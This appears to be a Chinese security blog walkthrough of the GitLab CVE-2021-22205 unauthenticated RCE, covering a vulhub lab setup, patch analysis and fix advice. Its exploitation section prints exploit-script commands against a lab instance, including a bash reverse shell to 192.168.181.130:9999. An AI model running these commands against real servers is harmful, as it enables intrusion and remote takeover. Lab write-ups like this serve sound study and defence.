# CVE-2021-22205 GITLAB 未授权 RCE 漏洞

阅读量 **212597**

发布时间 : 2022-04-15 15:30:54

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p0.ssl.qhimg.com/t012960fa67daeec1b5.jpg)

## 漏洞描述

GitLab是一款Ruby开发的Git项目管理平台。如11.9以后的GitLab中，因为使用了图片处理工具ExifTool而受到漏洞CVE-2021-22204（https://devcraft.io/2021/05/04/exiftool-arbitrary-code-execution-cve-2021-22204.html）的影响，攻击者可以通过一个未授权的接口上传一张恶意构造的图片，进而在GitLab服务器上执行命令。

## 利用条件

11.9 <= Gitlab CE/EE < 13.8.8

13.9 <= Gitlab CE/EE < 13.9.6

13.10 <= Gitlab CE/EE < 13.10.3

## 环境搭建

使用vulhub搭建漏洞环境。

git clone https://github.com/vulhub/vulhub.gitcd

进入 vulhub/gitlab/CVE-2021-22205 目录下

使用 docker-compose up -d 开始安装环境

环境部署完毕后，访问ip+8080、访问到以下页面，环境搭建成功。

![](https://p2.ssl.qhimg.com/t010e6e02110bd55b24.jpg)

## 漏洞分析

### **漏洞原理**

github上的diff记录对漏洞原理做简单分析。

审计源码、在 lib/gitlab/sanitizers/exif.rb 中 对允许的MIME类型做了修改 对上传文件类型的判断做了修复。

![](https://p1.ssl.qhimg.com/t01d70a93c5c68443b8.jpg)

![](https://p1.ssl.qhimg.com/t018815379564ec8d6e.jpg)

在 spec/lib/gitlab/sanitizers/exif_spec.rb 中对图像的规格检测做了修改。

![](https://p0.ssl.qhimg.com/t012aabc3aae03131eb.jpg)

在workhorse/internal/upload/uploads_test.go中对上传的图片、更新了校验规则、判断规则。

![](https://p1.ssl.qhimg.com/t01e18198b9fe5bc2db.jpg)

### **漏洞测试**

POC脚本测试如下：

python3 cve-2021-22205.py -v true -t http://127.0.0.1:8080

![](https://p1.ssl.qhimg.com/t01216746fbcabf3f4e.jpg)

### **漏洞利用**

可利用python脚本exp功能。

1\. 上传txt文件

python3 cve-2021-22205_exp.py -a true -t http://127.0.0.1:8080 -c “touch
/tmp/xl.txt”

![](https://p1.ssl.qhimg.com/t016cfb7e6b84b6a8da.jpg)

2\. 反弹shell

python3 cve-2021-22205_exp.py -a true -t http://127.0.0.1:8080 -c “echo ‘bash
-i >& /dev/tcp/192.168.181.130/9999 0>&1’ > /tmp/xl.sh”

![](https://p3.ssl.qhimg.com/t01a870dd476a0a5d70.jpg)

添加执行权限

python3 cve-2021-22205_exp.py -a true -t http://127.0.0.1:8080 -c “chmod +x
/tmp/xl.sh”

反弹shell

python3 cve-2021-22205_exp.py -a true -t http://127.0.0.1:8080 -c “/bin/bash
/tmp/xl.sh”

![](https://p5.ssl.qhimg.com/t016f527742ba2ce528.jpg)

## 修复建议

1\. 使用白名单、限制源ip；

2\. 更新到安全版本。

参考(https://hackerone.com/reports/1154542)

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **星阑科技** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/272061](/post/id/272061)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [漏洞分析](/tag/漏洞分析)
  * [GitLab](/tag/GitLab)

 **+1** __1赞

 __收藏

![](https://p0.ssl.qhimg.com/t01ae1a72a720da3a7b.png) 星阑科技

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

